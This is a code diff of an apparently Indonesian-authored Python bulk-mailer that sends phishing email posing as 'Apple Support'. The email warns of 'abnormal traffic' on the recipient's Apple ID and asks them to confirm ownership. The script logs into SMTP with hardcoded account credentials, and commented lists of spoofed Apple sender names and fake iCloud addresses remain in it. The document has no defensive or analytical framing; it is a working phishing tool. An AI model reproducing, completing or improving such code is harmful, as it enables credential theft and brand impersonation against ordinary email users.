@@ -498,23 +498,31 @@ elist = input('Email List: ')
 #----------------------------------------Area Config Coded Eric Pedra -------------------------------#
 #Login Your SMTP ! 
 gm = "fireflyddc@juno.com", "fireflyddc"
-def gmailx(xm, gm): #xm > email yang dijadikan list
-    #Headers Work All ,multi thread wait(perbaiki)
-    #rcpt = cc.split(",") + bcc.split(",") + [xm]
+def gmailx(xm, gm):
+	me = "Apple Support " 
+	#frommailer = ["Apple", "Apple Notice", "Apple Reminder", "Apple Locked", "Apple Disabled", "Apple Support", "Apple Alert", "Apple Security" , "Apple Service", "Apple Update"]
+   # iOS =  ['Windows 10', 'Windows 8.1', 'Windows 8', 'Windows 7', 'Windows Vista', 'Windows Server 2003/XP x64', 'Windows XP', 'Windows XP', 'Mac OS X', 'Mac OS 9', 'Linux', 'Ubuntu', 'iPhone', 'iPod', 'iPad', 'Android', 'BlackBerry', 'Mobile']
+  #  fakeemail =  ["younglex@icloud.com", "prabowo@icloud.com"]
+   # appsapple =["iTunes", "iCloud"]
+    
 	msg = MIMEMultipart('alternative')
-	msg['From'] = ""+me+" <"+Fromaddrs+">"
+	msg['Subject'] = "Case:[Our server detects abmormal traffic in your Apple-ld]"
+	msg['From'] = me
 	msg['To'] = xm
-	msg['Subject'] =   ""+Jadul+""
-	msg['MIME-Version']="1.0"
-	msg['X-MSMail-Priority'] = "High" #to set the priority [1 For High Priority | 2 For Medium Priority | 3 For Low Priority]
-	msg['Content-Transfer-Encoding'] = "quoted-printable"
-	msg['Content-Type'] = "text/html; charset=utf-8"
-	#msg['Reply-to'] = 'no-reply@pieroland.net'
-	#msg['Date'] = formatdate(localtime = True)
-	#msg['Cc'] = cc
-    #msg['Bcc'] = bcc
-	# #Fiture#
+	
 	#hanya = random.choice(letter) #letter 
+	#diindonesia = random.choice(subjectmailer) #random subject
+	#saja = random.choice(frommailer) #random subject
+	#bahas = random.choice(fakeemail) #random frommail
+	#halus = random.choice(appsapple) #random fakemail
+	#ahah = random.choice(iOS) #random OS
+   # wikwik = random.choice(countryq) #random countryq
+   # uname = ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz') for _ in range(16))
+  #  surname = ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz') for _ in range(6))
+  #  gname = ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz') for _ in range(6))
+ #   fpass = ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz12345678910') for _ in range(16))
+	ip = ''.join(random.choice('1234567890') for _ in range(3))
+	rd = ''.join(random.choice('1234567890abcdefghijklmnOPQRSTUVWXYZ') for _ in range(6))
 
 	text = ""
 	html = """\
@@ -572,60 +580,22 @@ go to Apple ID and make sure you are indeed the owner of the account.
 </TD></TABLE></BODY></html>
 	"""
 
-    #html = """  
-    # +ip=+
-#    +rd+
-#    +username+
-#   +domain+
-#    +bahas+
-#    +halus+
-#    +saja+
-#    +ahah+
-#    +ahahs+
-#   +wikwik+
-#"""
-
 	part1 = MIMEText(text, 'plain')
 	part2 = MIMEText(html, 'html')
-	#msg.attach(MIMEImage(file("abc.jpg").read()))
-	
-	
+
 	msg.attach(part1)
 	msg.attach(part2)
-    #msg.attach(img)
 
+	mail = smtplib.SMTP('smtp.gmail.net', 587)
 
-    #SMTP Server
-	mail = smtplib.SMTP('smtp.gmail.com', 587)    
-	
-	#Koneksi
-	mail.starttls()
 	mail.ehlo()
-	#mail.set_debuglevel(1) #seterah lu mau gunakan apa kagak yg penting work
-    #Login
+	mail.starttls()
+
 	noti = mail.login(gm[0], gm[1])
-	#mail.sendmail(me, rcpt, msg.as_string()) #Ini versi BCC
-    #Kirim
-	#mail.sendmail(me, xm, msg.as_string()) #xm email yg dijadikan list
-	#global bilbodog
-	#for i in range(5):
-		#thread= threading.Thread(target=gmailx)
-		#thread.xm = True
-
-	#Info Sending
-	print ("[+] Name From Mail: "), me
-	print ("[+] From Mail : "), Fromaddrs
-	print ("[+] Subject : "), Jadul
-	print ("[+] Username : "), username
-	print ("[+] Domain : "), domain
-	print (waktu()+str(noti)+str(xm)) #menambahkan xm akan menampilkan email yg dikirim tetapi enter jga aka terbaca
-	#thread_list.append(thread)
-	#thread.start()
-	#for thread in thread_list:
-	#thread.join()
-	#mailthread = gmailx()
+	mail.sendmail(me, xm, msg.as_string())
+	print ("[+] From Mail : ", me)
+	print (waktu()+str(noti)+str(xm))
 	mail.quit()
-
 
 if (kontol == 1):
     print ("\nGmail ...!")
